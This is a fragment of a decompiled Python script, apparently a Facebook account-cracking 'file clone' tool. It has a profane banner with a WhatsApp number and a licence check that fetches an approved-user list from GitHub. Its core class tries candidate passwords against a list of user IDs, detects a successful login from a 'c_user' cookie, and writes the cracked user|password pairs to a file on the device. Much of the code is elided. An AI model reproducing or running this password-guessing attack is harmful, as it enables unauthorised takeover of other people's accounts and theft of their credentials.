# Decompile by ASRAF FUCK SAJJAD FILE CLONE 
...
==================================================
           FUCKED BY : FX ARIYAN
           WHATSAPP : +8801796139512   
           FB PAGE  : FX ARIYAN CYBER-143
==================================================           
              \x1b[1;41m\x1b[1;97mTERA BAP HU \x1b[1;0m""")
...
def reg():
    ...
    try:
        ...
        reg2()
    r = requests.get('https://raw.githubusercontent.com/SHAHZADA-AHMED-SAJJAD/BEST-FILE-CLONE/main/Approved.txt').text
    if to in r:
        time.sleep(2)
        python_java()
    else:
...
def python_java():
    ...
    print(" \033[1;92m              F _ X A R I Y A N")
    print(" \033[1;95m ---------------------------------------------");time.sleep(0.03)
...
class __xyz__:
    ...
    def __metode__(self, user, __chi__, chachaji):
        global ok,cp,loop
        sys.stdout.write(f'\r [THE SAJJAD] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s \033[1;94m[SAJJAD-CP] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('/sdcard/SAJJAD-CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
